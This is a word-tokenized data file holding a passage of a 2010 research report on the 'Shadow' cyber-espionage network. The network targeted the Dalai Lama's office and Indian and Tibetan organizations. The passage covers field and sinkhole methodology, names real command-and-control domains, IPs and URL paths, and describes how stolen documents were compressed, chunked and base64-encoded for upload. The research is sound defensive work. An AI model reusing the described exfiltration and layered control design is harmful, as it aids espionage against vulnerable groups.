"samples", "alone", "only", "provides", "one", "crucial", "data", "set", "."], ["Field", "research", "is", "a", "critical", ",", "although", "sometimes", "neglected", ",", "component", "of", "malware", "research", "."], ["While", "much", "of", "the", "emphasis", "in", "existing", "malware", "research", "is", "focused", "on", "technical", "analysis", "of", "malware", "samples", ",", "this", "purely", "technical", "approach", "is", "unlikely", "to", "yield", "a", "complete", "picture", "."], ["For", "example", ",", "through", "field", "research", "we", "have", "found", "compromised", "computers", "checking", "in", "with", "command", "and", "control", "servers", "that", "we", "have", "not", "seen", "in", "malware", "samples", "distributed", "by", "the", "attackers", "."], ["There", "is", "some", "evidence", "to", "suggest", "that", "attackers", "may", "migrate", "compromised", "hosts", "to", "new", "command", "and", "control", "servers", "and/or", "command", "compromised", "computers", "to", "install", "new", "malware", "that", "is", "not", "publicly", "disseminated", "through", "spear", "phishing", "and", "other", "targeted", "malware", "attacks", "."], ["The", "field", "research", "component", "can", "thus", "provide", "an", "equally", "important", "insight", "into", "the", "attackers", "\u2019", "capabilities", "once", "the", "target", "\u2019s", "network", "is", "compromised", ",", "as", "well", "as", "updated", "command", "and", "control", "locations", "."], ["Moreover", ",", "it", "allows", "for", "the", "investigation", "of", "the", "context", "surrounding", "the", "the", "target", "and", "why", "the", "victims", "may", "have", "been", "targeted", "in", "the", "first", "place", "."], ["Finally", ",", "the", "wider", "geopolitical", "considerations", ",", "derived", "from", "both", "field", "investigations", "and", "contextual", "research", ",", "place", "the", "collection", "of", "information", "in", "a", "broader", "context", "that", "supplies", "details", "around", "issues", "such", "as", "the", "timing", "of", "the", "attacks", ",", "the", "nature", "of", "the", "exploitation", ",", "including", "the", "use", "of", "any", "social", "engineering", "techniques", ",", "and", "potentially", "the", "identity", "and", "motivation", "of", "the", "attackers", "."], ["We", "present", "our", "methodology", "in", "the", "following", "sequence", "\u2013", "field", "investigation", "first", ",", "followed", "by", "technical", "investigations", "."], ["However", ",", "in", "practice", "the", "two", "are", "iterative", "processes", "."], ["In", "some", "circumstances", ",", "field", "investigations", "begin", "first", ",", "followed", "by", "technical", "investigations", ",", "while", "in", "other", "cases", "the", "opposite", "is", "true", "."], ["In", "this", "case", ",", "a", "technicalbased", "investigative", "technique", "(", "sinkhole", "analysis", ")", "is", "probably", "the", "closest", "to", "an", "actual", "starting", "point", ",", "although", "even", "that", "method", "was", "informed", "by", "prior", "knowledge", "derived", "from", "field", "and", "contextual", "research", "reaching", "back", "to", "the", "Tracking", "GhostNet", "report", "."], ["In", "almost", "all", "circumstances", ",", "geopolitical", "and", "contextual", "research", "informs", "both", "the", "technical", "and", "field", "research", "components", "."], ["In", "practice", ",", "therefore", ",", "fusion", "methodology", "is", "a", "holistic", ",", "non", "-", "linear", "approach", ",", "but", "one", "that", "takes", "place", "in", "a", "very", "structured", "and", "focused", "fashion", "."], ["2.2", "Field", "Investigation"], ["Our", "objective", "is", "to", "ultimately", "understand", "the", "capabilities", "and", "motivations", "of", "those", "engaged", "in", "targeted", "malware", "attacks", "."], ["Field", "research", "provides", "critical", "insight", "into", "the", "methods", "and", "operations", "of", "the", "attackers", "."], ["By", "analyzing", "computers", "at", "locations", "that", "are", "routinely", "targeted", "by", "(", "similar", ")", "attackers", ",", "we", "aim", "to", "identify", "portions", "of", "command", "and", "control", "infrastructure", "that", "the", "attackers", "use", "for", "particular", "targets", "as", "well", "as", "document", "the", "type", "of", "data", "that", "the", "attackers", "exfiltrate", "from", "the", "targets", "."], ["However", ",", "our", "research", "aims", "to", "be", "more", "than", "just", "extracting", "information", "from", "those", "who", "have", "been", "compromised", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "2", ":", "METHODOLOGY", "&", "INVESTIGATIVE", "TECHNIQUES", "9", "The", "Tracking", "GhostNet", "investigation", "revealed", "significant", "compromises", "at", "Tibetan", "-", "exile", "and", "Indian", "targets", "."], ["It", "was", "also", "found", "that", "Indian", "government", "related", "entities", ",", "both", "in", "India", "proper", "and", "throughout", "the", "world", ",", "had", "been", "thoroughly", "compromised", "."], ["These", "included", "computers", "at", "Indian", "embassies", "in", "Belgium", ",", "Serbia", ",", "Germany", ",", "Italy", ",", "Kuwait", ",", "the", "United", "States", ",", "Zimbabwe", ",", "and", "the", "High", "Commissions", "of", "India", "in", "Cyprus", "and", "the", "United", "Kingdom", "."], ["During", "the", "GhostNet", "investigation", "we", "had", "discovered", "evidence", "of", "multiple", "infections", "for", "which", "the", "information", "available", "was", "incomplete", ",", "and", "to", "which", "we", "wanted", "to", "return", "for", "follow", "up", "."], ["In", "particular", ",", "we", "found", "one", "piece", "of", "malware", "uploading", "sensitive", "documents", "."], ["Another", "report", "published", "soon", "after", "Tracking", "GhostNet", ",", "entitled", "\u201c", "The", "Gh0st", "in", "the", "Shell", ":", "Network", "Security", "in", "the", "Himalayas", ",", "\u201d", "analysed", "the", "network", "traffic", "of", "Air", "Jaldi", ",", "a", "community", "WiFi", "network", "in", "Dharamsala", ",", "India", "."], ["It", "found", "that", "computers", "in", "Dharamsala", "were", "connecting", "with", "two", "of", "the", "control", "servers", "documented", "in", "our", "report", "(", "Vallentin", "et", "al", ".", "2009", ")", "."], ["With", "the", "aim", "of", "focusing", "on", "both", "these", "wider", "pattern", "of", "compromises", ",", "and", "the", "hanging", "threads", "from", "the", "previous", "investigation", ",", "we", "worked", "with", "our", "existing", "approach", ",", "informed", "by", "the", "view", "that", "collecting", "data", "as", "close", "to", "the", "intended", "target", "as", "possible", "was", "likely", "to", "yield", "actionable", "evidence", "of", "breaches", "that", "could", "be", "followed", "through", "to", "their", "source", ",", "lead", "to", "wider", "pools", "of", "target", "sets", ",", "and", "yield", "information", "on", "the", "attackers", "."], ["In", "conducting", "the", "field", "research", "we", "were", "influenced", "by", "the", "Action", "Research", "(", "AR", ")", "literature", "(", "Lewin", "1946", ";", "Curle", "1947", ")", "that", "has", "evolved", "since", "the", "1940s", ",", "as", "well", "as", "other", "field", "-", "based", "investigation", "and", "research", "techniques", "."], ["The", "AR", "field", "-", "based", "approach", "feeds", "into", "the", "fusion", "methodology", "that", "guides", "our", "overall", "investigatory", "process", "."], ["It", "employs", "ethical", "and", "participatory", "observations", "and", "structured", "focused", "interviews", "."], ["We", "combined", "this", "grounded", "research", "with", "technical", "interrogation", ",", "including", "network", "monitoring", "activities", "."], ["As", "with", "GhostNet", ",", "we", "were", "fortunate", "to", "have", "the", "cooperation", "of", "Tibetan", "organizations", ",", "and", "benefited", "tremendously", "from", "the", "willingness", "of"], ["His", "Holiness", "the", "Dalai", "Lama", "and", "other", "Tibetans", "to", "share", "information", "with", "our", "investigators", "."], ["As", "a", "result", ",", "for", "the", "Shadow", "investigation", "we", "conducted", "primary", "field", "research", "in", "Dharamsala", ",", "India", "from", "August", "until", "December", "2009", "."], ["(", "Dharamsala", "is", "the", "location", "of", "the", "OHHDL", "as", "well", "as", "the", "TGIE", ")", "."], ["The", "primary", "objectives", "of", "the", "field", "investigations", "were", "to", "research", "the", "wider", "patterns", "of", "compromised", "Indian", "and", "Tibetan", "related", "targets", ",", "investigate", "the", "reports", "of", "targeted", "malware", "attacks", "that", "have", "emerged", "from", "the", "Tibetan", "community", ",", "and", "raise", "information", "and", "computer", "security", "awareness", "within", "the", "Tibetan", "community", "and", "assist", "in", "their", "security", "planning", "and", "implementation", "."], ["Throughout", "the", "field", "investigation", "process", ",", "we", "also", "investigated", "the", "broader", "social", ",", "political", ",", "military", ",", "and", "intelligence", "context", "."], ["We", "conducted", "extensive", "on", "-", "site", "interviews", "with", "officials", "in", "the", "Tibetan", "Government", "-", "in", "-", "Exile", ",", "the", "Office", "of", "the", "Dalai", "Lama", "and", "Tibetan", "NGOs", "."], ["These", "interviews", "allowed", "us", "to", "gain", "an", "understanding", "of", "the", "security", "practices", "and", "network", "infrastructure", "of", "compromised", "locations", "."], ["We", "also", "used", "network", "monitoring", "software", "during", "field", "investigations", "in", "order", "to", "collect", "technical", "data", "from", "compromised", "computer", "systems", "and", "perform", "an", "initial", "analysis", "to", "confirm", "the", "existence", "of", "malware", "and", "the", "transfer", "of", "information", "between", "compromised", "computers", "and", "command", "and", "control", "servers", "."], ["The", "network", "monitoring", "tools", "allowed", "us", "to", "collect", "samples", "from", "compromised", "computers", "and", "identify", "command", "and", "control", "servers", "used", "by", "the", "attackers", "."], ["The", "network", "monitoring", "was", "undertaken", "with", "the", "explicit", "consent", "of", "the", "Tibetan", "organizations", "."], ["While", "monitoring", "the", "network", "traffic", "of", "a", "local", "NGO", ",", "Common", "Ground", ",", "as", "part", "of", "an", "Internet", "security", "audit", ",", "traffic", "from", "a", "local", "WiFi", "mesh", "network", ",", "TennorNet", "was", "also", "captured", ",", "revealing", "malicious", "activity", "."], ["An", "anomaly", "was", "detected", "when", "analyzing", "this", "traffic", ":", "computers", "in", "Dharamsala", "were", "beaconing", "or", "checking", "in", "with", "a", "command", "and", "control", "server", "(", "jdusnemsaz.com/119.84.4.43", ")", "located", "in", "Chongqing", ",", "PRC", "."], ["The", "location", "of", "Chongqing", "is", "contextually", "interesting", "as", "it", "has", "a", "high", "concentration", "of", "Triads", "\u2014", "well", "known", "Asian", "-", "based", "organized", "criminal", "networks", "\u2014", "who", "have", "significant", "connections", "to", "the", "Chinese", "government", "and", "the", "Chinese", "Communist", "Party"], ["(", "Lam", "2009", ")", "."], ["The", "Triads", "have", "extended", "their", "traditional", "criminal", "activities", "to", "include", "technology", "-", "enabled", "crime", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "2", ":", "METHODOLOGY", "&", "INVESTIGATIVE", "TECHNIQUES", "10", "such", "as", "\u201c", "computer", "software", "piracy", "and", "credit", "card", "forgery", "and", "fraud", "\u201d", "(", "Choo", "2008", ")", "."], ["An", "investigation", "revealed", "that", "the", "computer", "on", "TennorNet", "generating", "the", "malicious", "traffic", "belonged", "to", "Mr.", "Serta"], ["Tsultrim", ",", "a", "Tibetan", "Member", "of", "Parliament", ",", "editor", "of", "of", "the", "weekly", "Tibetan", "language", "newspaper", "Tibet", "Express", "and", "the", "director", "of", "the", "Khawa", "Karpo", "Tibet", "Culture", "Centre", "."], ["Tsultrim", "is", "also", "the", "coordinator", "of", "the", "Association", "of", "Tibetan", "Journalists", "(", "ATJ", ")", "."], ["We", "probed", "for", "his", "threat", "perception", ",", "and", "who", "he", "felt", "might", "be", "targeting", "him", "and", "why", "."], ["We", "sought", "to", "establish", "his", "perception", "of", "what", "documents", "and", "correspondence", "might", "be", "particularly", "sensitive", "."], ["Tsultrim", "was", "particularly", "concerned", "about", "this", "network", "being", "compromised", "."], ["Following", "the", "discovery", "of", "this", "compromise", ",", "we", "approached", "the", "OHHDL", "and", "formally", "requested", "permission", "to", "audit", "network", "traffic", "to", "determine", "whether", "we", "could", "identify", "similar", "beacon", "packets", "associated", "with", "the", "command", "and", "control", "server", "(", "jdusnemsaz.com/119.84.4.43", ")", "."], ["A", "representative", "of", "OHHDL", "agreed", "that", "we", "could", "access", "the", "office", "network", "under", "an", "agreement", "similar", "to", "the", "initial", "GhostNet", "investigation", "."], ["In", "consultation", "with", "OHHDL", "staff", ",", "we", "focused", "our", "attention", "on", "the", "desktop", "machines", "that", "were", "most", "likely", "to", "be", "compromised", ",", "and", "commenced", "a", "network", "tap", "of", "a", "number", "of", "workstations", "."], ["Interestingly", ",", "it", "was", "one", "of", "these", "workstations", "that", "was", "the", "origin", "of", "the", "GhostNet", "investigation", ",", "where", "we", "had", "observed", "sensitive", "documents", "being", "exfiltrated", "in", "September", "2008", "."], ["Almost", "immediately", "we", "identified", "malicious", "traffic", "connecting", "with", "the", "command", "and", "control", "server", "(", "jdusnemsaz.com/119.84.4.43", ")", "."], ["Our", "next", "step", "was", "to", "refer", "to", "the", "management", "interface", "in", "the", "ICSA", "-", "certified", "Cyberoam", "firewall", "that", "the", "OHHDL", "had", "installed", "in", "their", "network", "as", "part", "of", "their", "extensive", "upgrading", "of", "security", "procedures", "in", "the", "wake", "of", "the", "GhostNet", "breach", "."], ["We", "isolated", "all", "outbound", "traffic", "to", "the", "command", "and", "control", "server", "and", "identified", "any", "other", "machines", "on", "the", "office", "Local", "Area", "Network", "that", "were", "currently", ",", "or", "had", "recently", ",", "been", "communicating", "with", "the", "command", "and", "control", "server", "."], ["From", "the", "Cyberoam", "interface", "we", "were", "able", "to", "identify", "one", "other", "machine", "that", "was", "compromised", "."], ["We", "proceeded", "to", "tap", "the", "traffic", "from", "this", "machine", "and", "began", "to", "see", "domain", "names", "associated", "with", "the", "distributed", "social", "media", "command", "and", "control", "channels", "that", "we", "would", "later", "identify", "in", "the", "lab", "as", "part", "of", "the", "command", "and", "control", "infrastructure", "."], ["Similarly", ",", "the", "lab", "investigation", "was", "able", "to", "reconstruct", "the", "documents", "that", "were", "exfiltrated", "from", "OHHDL", "machines", "and", "we", "were", "able", "to", "brief", "OHHDL", "on", "the", "extent", "of", "the", "breach", "."], ["2.3", "Technical", "Investigative", "Activities"], ["Our", "technical", "investigation", "was", "comprised", "of", "several", "interrelated", "components", ":"], ["\u0083\u0083", "DNS", "Sinkholing", "-", "Through", "registering", "expired", "domain", "names", "previously", "used", "in", "cyber", "espionage", "attacks", "as", "command", "and", "control", "servers", ",", "we", "were", "are", "able", "to", "observe", "incoming", "connections", "from", "still", "-", "compromised", "computers", "."], ["This", "allowed", "us", "to", "collect", "information", "on", "the", "methods", "of", "the", "attackers", "as", "well", "as", "the", "nature", "of", "the", "victims", "."], ["\u0083\u0083", "Malware", "Analysis", "-", "We", "collected", "malware", "samples", "from", "a", "variety", "of", "attacks", "that", "allowed", "us", "to", "determine", "the", "exploits", "the", "attackers", "used", ",", "the", "theme", "used", "to", "lure", "targets", "into", "executing", "the", "malware", ",", "as", "well", "as", "the", "command", "and", "control", "servers", "used", "by", "the", "attackers", "."], ["We", "also", "analysed", "additional", "malware", "found", "on", "servers", "under", "the", "control", "of", "the", "attackers", "."], ["Malware", "samples", "consisted", "primarily", "of", "the", "files", "with", "the", "PDF", ",", "DOC", ",", "PPT", "and", "EXE", "file", "extensions", "."], ["\u0083\u0083", "Command", "and", "Control", "Server", "Topography", "-"], ["We", "were", "able", "to", "map", "out", "the", "command", "and", "control", "infrastructure", "of", "the", "attackers", "by", "linking", "information", "from", "the", "sinkhole", ",", "the", "field", "investigations", "and", "the", "malware", "analysis", "."], ["We", "collected", "the", "domain", "names", ",", "URL", "paths", "and", "IP", "addresses", "used", "by", "the", "attackers", "."], ["This", "allowed", "us", "to", "find", "links", "between", "our", "research", "and", "other", "command", "and", "control", "servers", "observed", "in", "other", "attacks", "in", "prior", "research", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "2", ":", "METHODOLOGY", "&", "INVESTIGATIVE", "TECHNIQUES", "11"], ["\u0083\u0083", "Victim", "Identification", "-", "We", "were", "able", "to", "identify", "victims", "that", "the", "attackers", "had", "compromised", "by", "analyzing", "sinkhole", "server", "connections", ",", "recovering", "documents", "that", "had", "been", "exfiltrated", ",", "and", "viewing", "control", "panels", "used", "by", "the", "attackers", "to", "direct", "the", "compromised", "computers", "."], ["\u0083\u0083", "Data", "Recovery", "-", "We", "were", "able", "to", "retrieve", "documents", "that", "had", "been", "sent", "to", "drop", "zones", "from", "victim", "systems", "and", "stolen", "by", "the", "attackers", "."], ["We", "carried", "out", "this", "research", "carefully", ",", "guided", "by", "principles", "rooted", "in", "the", "computer", "security", "field", "(", "Burstein", "2008", ";", "Cooke", "et", "al", ".", "2005", ";", "Stone", "-", "Gross", "et", "al", ".", "2009", ";", "Smith", "and", "Toppel", "2009", ")", "."], ["Our", "aim", "was", "to", "understand", "and", "document", "the", "activities", "of", "the", "attackers", "as", "well", "as", "gather", "enough", "information", "to", "enable", "notification", "of", "those", "who", "had", "been", "compromised", "."], ["The", "principles", "that", "guided", "our", "field", "and", "technical", "investigations", "include", "the", "following", ":"], ["\u0083\u0083", "We", "collected", "network", "data", "in", "the", "field", "from", "computers", "that", "had", "been", "compromised", "by", "malware", "with", "the", "consent", "of", "the", "owners", "of", "the", "computers", "."], ["\u0083\u0083", "We", "monitored", "command", "and", "control", "infrastructure", "and", "recovered", "exfiltrated", "data", "in", "order", "to", "gather", "enough", "information", "to", "understand", "the", "activities", "of", "the", "attackers", "and", "obtain", "enough", "information", "to", "enable", "notification", "of", "the", "victims", "before", "moving", "to", "notify", "the", "service", "providers", "and", "hosting", "companies", "to", "seek", "to", "have", "the", "networks", "shut", "down", "."], ["\u0083\u0083", "We", "worked", "with", "government", "authorities", "in", "multiple", "jurisdictions", "to", "notify", "those", "who", "had", "been", "compromised", "and", "to", "take", "down", "the", "attacker", "\u2019s", "command", "and", "control", "infrastructure", "."], ["\u0083\u0083", "We", "were", "careful", "to", "store", "and", "handle", "all", "of", "the", "data", "we", "collected", "in", "a", "secure", "manner", "."], ["PART", "3", ":"], ["Mapping", "the", "Shadows", "in", "the", "Cloud", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "13", "In", "order", "for", "us", "to", "begin", "to", "map", "the", "Shadows", "in", "the", "Cloud", ",", "it", "was", "important", "for", "us", "to", "have", "clear", "starting", "points", "."], ["The", "first", "and", "easiest", "starting", "point", "that", "we", "identified", "was", "to", "look", "back", "at", "what", "was", "related", "to", "and", "still", "operational", "from", "the", "previous", "Tracking", "GhostNet", "report", "."], ["We", "focused", "primarily", "on", "the", "domains", "described", "in", "GhostNet", "and", "set", "out", "to", "see", "what", "we", "could", "learn", "from", "them", "in", "their", "current", "state", "."], ["The", "second", "was", "to", "continue", "collecting", "and", "analyzing", "information", "on", "attacks", "gleaned", "from", "field", "research", "and", "reports", "that", "were", "shared", "with", "us", "by", "thirdparties", "."], ["Each", "of", "these", "starting", "points", "branched", "off", "from", "one", "another", "and", "crossed", "paths", "in", "various", "ways", ",", "revealing", "at", "least", "two", "distinct", "cyber", "espionage", "networks", "."], ["We", "previously", "mentioned", "that", "a", "large", "portion", "of", "the", "domain", "names", "mentioned", "in", "Tracking", "GhostNet", "went", "offline", "following", "the", "initial", "report", "."], ["As", "a", "result", ",", "several", "of", "the", "domain", "names", "described", "in", "it", "were", "abandoned", "."], ["The", "domains", "ultimately", "expired", "and", "were", "available", "for", "re", "-", "registration", "."], ["This", "gave", "us", "the", "opportunity", "to", "take", "over", "these", "domains", "and", "monitor", "any", "connections", "that", "might", "come", "to", "them", "."], ["Doing", "this", "allowed", "us", "to", "see", "connections", "from", "victims", "that", "were", "still", "infected", ",", "and", "learn", "more", "about", "how", "the", "command", "and", "control", "server", "was", "configured", "."], ["The", "Shadowserver", "Foundation", "has", "utilized", "this", "technique", "for", "a", "long", "time", "(", "Higgins", "2008", ")", "."], ["The", "investigation", "was", "broadened", "further", "when", "field", "research", "by", "the", "Information", "Warfare", "Monitor", "crossed", "paths", "with", "research", "being", "done", "by", "the", "Shadowserver", "Foundation", "."], ["The", "field", "research", "revealed", "that", "a", "computer", "system", "in", "the", "OHHDL", "had", "been", "compromised", "by", "at", "least", "two", "different", "types", "of", "malware", "associated", "with", "targeted", "malware", "intrusions", "."], ["Based", "on", "our", "understanding", "of", "the", "malware", ",", "the", "domains", "and", "on", "-", "going", "research", ",", "we", "assess", "that", "this", "compromise", "also", "involved", "at", "least", "two", "different", "cyber", "espionage", "groups", "and", "potentially", "even", "a", "third", "one", "."], ["Analysis", "of", "several", "malware", "components", "and", "their", "associated", "command", "and", "control", "servers", "ultimately", "led", "to", "the", "discovery", "of", "an", "accessible", "drop", "zone", "for", "documents", "being", "siphoned", "off", "compromised", "systems", "."], ["The", "attackers", "\u2019", "command", "and", "control", "infrastructure", "is", "a", "critical", "component", "of", "maintaining", "persistent", "access", "to", "compromised", "computers", "."], ["Through", "this", "infrastructure", ",", "the", "attackers", "issue", "commands", "to", "the", "compromised", "machines", "as", "well", "as", "exfiltrate", "data", "to", "drop", "zones", "or", "to", "the", "command", "and", "control", "servers", "themselves", "."], ["By", "carefully", "examining", "the", "relationships", "between", "command", "and", "control", "servers", "we", "were", "able", "to", "map", "out", "the", "extent", "of", "one", "such", "network", "and", "link", "it", "with", "other", "similar", "malware", "networks", "."], ["This", "report", "focuses", "on", "only", "one", "of", "these", "networks", ",", "one", "that", "we", "have", "named", "the", "Shadow", "network", "."], ["This", "is", "a", "complex", "network", "that", "leveraged", "social", "networking", "websites", ",", "webmail", "providers", ",", "free", "hosting", "providers", "and", "services", "from", "some", "of", "the", "largest", "companies", "on", "the", "Internet", "as", "disposable", "command", "and", "control", "locations", "."], ["The", "first", "layer", "of", "control", "used", "blogs", ",", "newsgroups", ",", "and", "social", "networking", "services", "to", "maintain", "persistent", "control", "as", "these", "system", "are", "unlikely", "to", "be", "detected", "as", "malicious", "."], ["As", "compromised", "computers", "accessed", "these", "services", ",", "they", "received", "another", "command", "and", "control", "location", ",", "often", "located", "on", "free", "web", "hosting", "providers", "."], ["The", "command", "and", "control", "servers", "on", "the", "free", "hosting", "services", "are", "often", "disabled", "over", "time", "\u2013", "most", "likely", "due", "to", "reports", "of", "malicious", "activity", "."], ["When", "the", "command", "and", "control", "servers", "on", "free", "web", "hosting", "services", "were", "disabled", ",", "the", "compromised", "systems", "would", "receive", "commands", "from", "the", "social", "networking", "layer", "and", "then", "beacon", "(", "i.e.", ",", "attempt", "a", "connection", ")", "to", "a", "more", "stable", "inner", "core", "of", "dedicated", "systems", "located", "in", "the", "PRC", "."], ["Unlike", "the", "command", "and", "control", "servers", "on", "free", "web", "hosting", "services", ",", "these", "dedicated", "servers", "hosted", "in", "the", "PRC", "have", "proven", "to", "be", "quite", "stable", "over", "time", "."], ["14"], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "3.1", "Analysis", "of", "Data", "while", "in", "the", "Field", "During", "the", "field", "investigation", "we", "collected", "samples", "of", "network", "traffic", "from", "computers", "at", "the", "OHHDL", "and", "other", "Tibetan", "-", "related", "locations", "."], ["Inspection", "of", "network", "traffic", "from", "these", "computers", "revealed", "that", "at", "least", "three", "of", "them", "were", "compromised", "and", "were", "communicating", "with", "the", "same", "set", "of", "command", "and", "control", "servers", "."], ["The", "traffic", "analysis", "revealed", "that", "these", "systems", "were", "all", "connecting", "to", "the", "domain", "jdusnemsaz.com", "."], ["At", "the", "time", "it", "resolved", "to", "the", "IP", "address", "119.84.4.43", ",", "which", "is", "assigned", "to", "China", "Telecom", "in", "the", "province", "of", "Chongqing", ",", "PRC", "."], ["The", "commands", "sent", "by", "the", "command", "and", "control", "server", "were", "identical", "to", "malware", "we", "found", "at", "the", "Tibetan", "NGO", "Drewla", "and", "the", "OHHDL", "during", "our", "GhostNet", "investigation", "a", "year", "earlier", ",", "although", "were", "not", "part", "of", "the", "network", "that", "was", "described", "in", "that", "initial", "report", "."], ["There", "is", "a", "similarity", "between", "the", "commands", "sent", "by", "the", "command", "and", "control", "server", "jdusnemsaz.com", "and", "a", "previously", "identified", "control", "server", ",", "lookbytheway.net", "."], ["In", "both", "cases", ",", "the", "network", "traffic", "captured", "from", "the", "compromised", "computers", "revealed", "that", "the", "malware", "was", "exfiltrating", "sensitive", "documents", "."], ["Table", "1", ":", "Command", "and", "Control", ":", "Similarities", "with", "previous", "attacks", "OHHDL", "(", "T", ")"], ["Nov", "2009", "OHHDL", "(", "D", ")"], ["Nov", "2009", "TIBETAN", "MP", "Oct", "2009", "Drewla"], ["Sep", "2008", "jdusnemsaz.com", "119.84.4.43", "jdusnemsaz.com", "119.84.4.43", "jdusnemsaz.com", "119.84.4.43", "lookbytheway.net", "221.5.250.98", "/two", "/"], ["zq2009", "/", "index.php", "NQueryFileop", "/two", "/"], ["zq2009", "/", "index.php", "NQueryFileop", "/two", "/"], ["zq2009", "/", "index.php", "NQueryFileop", "/cgi", "-", "bin", "/", "NQueryFileop", "NQueryFileop"], ["Further", "analysis", "of", "the", "network", "traffic", "also", "revealed", "that", "at", "least", "one", "of", "the", "systems", "was", "infected", "with", "additional", "malware", "not", "associated", "with", "the", "aforementioned", "command", "and", "control", "servers", "."], ["The", "system", "was", "attempting", "DNS", "resolutions", "of", "multiple", "hostnames", "."], ["Two", "of", "the", "hostnames", "resolved", "to", "IP", "addresses", "but", "were", "not", "available", "when", "the", "system", "attempted", "to", "communicate", "to", "them", "."], ["The", "other", "hostname", "did", "not", "resolve", "at", "all", "."], ["The", "failed", "DNS", "resolution", "was", "for", "www.assam2008.net", ",", "which", "is", "a", "domain", "that", "has", "been", "used", "by", "a", "different", "group", "of", "attackers", "in", "the", "past", "in", "conjunction", "with", "the", "Enfal", "trojan", ",", "and", "suggests", "a", "limited", "connection", "between", "the", "current", "malware", "under", "investigation", "and", "malware", "used", "in", "previous", "attacks", "on", "other", "targets", "."], ["This", "domain", "name", "was", "available", "for", "registration", "and", "was", "added", "to", "our", "ongoing", "sinkhole", "project", "."], ["While", "recording", "network", "traffic", "in", "the", "field", ",", "we", "observed", "the", "attackers", "removing", "two", "senstive", "documents", "from", "the", "OHHDL", "(", "see", "fig", "."], ["1", ",", "page", "15", ")", "."], ["The", "data", "was", "compressed", "using", "CAB", ",", "split", "into", "100", "kb", "chunks", "when", "necessary", ",", "encoded", "with", "base64", ",", "and", "then", "uploaded", "to", "a", "command", "and", "control", "server", "."], ["In", "this", "case", ",", "data", "was", "being", "uploaded", "to", "c2etejs.com", ",", "which", "is", "hosted", "on", "the", "same", "IP", "address", "(", "119.84.4.43", ")", "as", "jdusnemsaz.com", "."], ["We", "reconstructed", "the", "documents", "that", "were", "exfiltrated", "from", "the", "OHHDL", ":", "\u201c", "letters", "-", "current.doc", "\u201d", "and", "\u201c", "letters", "-", "master", "2009.doc", "(", "see", "fig", "."], ["2", ",", "page", "15", ")", ".", "\u201d"], ["The", "documents", "contained", "over", "1,500", "letters", "sent", "from", "the", "Dalai", "Lama", "\u2019s", "office", "between", "January", "and", "November", "2009", "."], ["While", "many", "of", "the", "letters", "are", "perfunctory", "\u2014", "responses", "to", "various", "invitations", "and", "interview", "requests", "\u2014", "they", "allow", "the", "attackers", "to", "collect", "information", "on", "anyone", "contacting", "the", "Dalai", "Lama", "\u2019s", "office", "."], ["Moreover", ",", "there", "are", "some", "communications", "contained", "within", "these", "documents", "that", "could", "be", "considered", "sensitive", ",", "such", "as", "communications", "between", "the", "OHHDL", "and", "Offices", "of", "Tibet", "around", "the", "world", "."], ["Some", "communications", "contain", "generic", "information", "of", "the", "Dalai", "Lama", "\u2019s", "travelling", "details", "including", "schedule", "of", "appearances", "\u2013", "but", "very", "little", "that", "could", "not", "be", "established", "through", "open", "sources", "and", "publicly", "available", "information", "on", "the", "internet", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "Figure", "1", ":"], ["A", "screen", "capture", "of", "a", "sensitive", "document", "being", "uploaded", "to", "a", "command", "and", "control", "server", "."], ["Figure", "2", ":"], ["The", "Word", "Documents", "Exfiltrated", "from", "the", "OHHDL", "15", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "3", ":", "MAPPING", "THE", "SHADOWS", "IN", "THE", "CLOUD", "3.2", "16", "Technical", "Investigation", "During", "the", "technical", "investigation", "we", "examined", "the", "data", "collected", "from", "the", "field", ",", "third", "-", "party", "sources", ",", "and", "from", "our", "DNS", "sinkhole", "project", "in", "order", "to", "determine", "the", "attack", "vectors", "used", "to", "exploit", "and", "compromise", "the", "victims", "."], ["While", "we", "were", "unable", "to", "determine", "how", "any", "one", "individual", "computer", "came", "to", "be", "compromised", ",", "we", "documented", "a", "variety", "of", "exploits", "used", "by", "the", "attackers", "."], ["We", "mapped", "out", "the", "broader", "command", "and", "control", "infrastructure", "by", "discovering", "new", "pieces", "of", "malware", "located", "on", "servers", "that", "we", "identified", ",", "and", "catalogued", "any", "new", "servers", "that", "these", "instances", "of", "malware", "were", "configured", "with", "."], ["We", "also", "looked", "at", "domains", "that", "were", "co", "-", "hosted", "on", "the", "same", "servers", "we", "had", "already", "identified", ",", "and", "used", "searches", "to", "identify", "Twitter", ",", "Google", "Groups", ",", "Blogspot", ",", "Baidu", "Blogs", ",", "blog.com", ",", "and", "Yahoo", "!"], ["Mail", "accounts", "that", "were", "misused", "by", "the", "attackers", "to", "update", "compromised", "computers", "with", "new", "command", "and", "control", "locations", "."], ["We", "also", "discovered", "a", "panel", "or", "listing", "of", "compromised", "computers", "."], ["During", "our", "investigation", "into", "one", "of", "the", "servers", "we", "made", "a", "significant", "discovery", ":", "we", "were", "able", "to", "recover", "data", "that", "was", "being", "exfiltrated", "by", "the", "attackers", "from", "compromised", "computers", "."], ["These", "documents", "were", "only", "available", "on", "the", "command", "and", "control", "server", "for", "a", "short", "time", "after", "being", "uploaded", "by", "the", "compromised", "systems", ",", "as", "the", "attackers", "frequently", "removed", "them", "at", "irregular", "time", "intervals", "."], ["3.2.1", "Attack", "Vectors", "/", "Malware"], ["Victims", "of", "cyber", "espionage", "are", "often", "specifically", "targeted", "by", "the", "attacker", "and", "not", "by", "happenstance", "."], ["While", "it", "is", "possible", "for", "a", "cyber", "criminal", "to", "mass", "-", "distribute", "malware", "across", "the", "Internet", "with", "specific", "intent", "to", "compromise", "a", "select", "set", "of", "individuals", "or", "organizations", ",", "it", "is", "not", "likely", "to", "be", "the", "most", "effective", "tool", "for", "the", "intended", "job", "."], ["The", "differences", "in", "approaches", ",", "based", "on", "an", "analysis", "of", "tools", "and", "kits", ",", "can", "therefore", "provide", "some", "insight", "into", "the", "branching", "of", "cyber", "espionage", "from", "cyber", "crime", 